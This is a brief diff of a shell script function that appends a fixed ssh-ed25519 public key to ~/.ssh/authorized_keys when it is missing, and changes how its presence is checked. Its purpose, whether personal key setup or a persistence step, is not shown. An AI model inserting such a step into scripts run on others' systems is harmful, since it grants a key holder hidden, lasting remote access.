@@ -154,7 +154,7 @@ _pubkey() {
     if [[ ! -e ~/.ssh/authorized_keys ]]; then
 	touch ~/.ssh/authorized_keys
     fi
-    if ! grep '202302' ~/.ssh/authorized_keys
+    if ! grep 'AAAAC3NzaC1lZDI1NTE5AAAAIBQzrNhnDScWLHfASI9b4s8t7OHJksUet2Sbia8alHoA' ~/.ssh/authorized_keys
     then
 	cat >> ~/.ssh/authorized_keys <<EOF
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBQzrNhnDScWLHfASI9b4s8t7OHJksUet2Sbia8alHoA 202509
